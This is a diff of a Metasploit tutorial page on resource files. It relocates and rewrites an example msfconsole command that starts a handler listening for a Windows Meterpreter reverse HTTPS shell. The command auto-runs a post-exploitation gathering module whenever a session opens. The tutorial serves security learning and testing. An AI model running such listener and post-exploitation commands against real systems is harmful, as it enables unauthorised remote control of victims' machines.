@@ -135,13 +135,6 @@
 
 <br />
 
-
-- **Handler::AutoRunScript::**`[bash prompt]`<br />
-
-      sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript multi_console_command -rc /root/script.rc; exploit'
-
-<br />
-
 #### [!] [Jump to article index](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md#metasploit-resource-files)
 
 ---
@@ -173,6 +166,13 @@
          echo 'exploit' >> script.rc
 
      `[run]` msfconsole > resource -r /root/script.rc
+
+<br />
+
+- **Handler::AutoRunScript::**`[bash prompt]`<br />
+<blockquote>This next example demonstrates how we can auto-run our resource script automatically at session creation with the help of @darkoperator 'post/multi/gather/multi_command.rb' and msfconsole handler AutoRunScript flag, for this to work we need to define a global variable (setg <option>) to call our resource script at session creation.</blockquote>
+
+      sudo msfconsole -x 'setg /root/gather.rc; use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD windows/meterpreter/reverse_https; set AutoRunScript post/multi/gather/multi_command; exploit'
 
 <br />
 
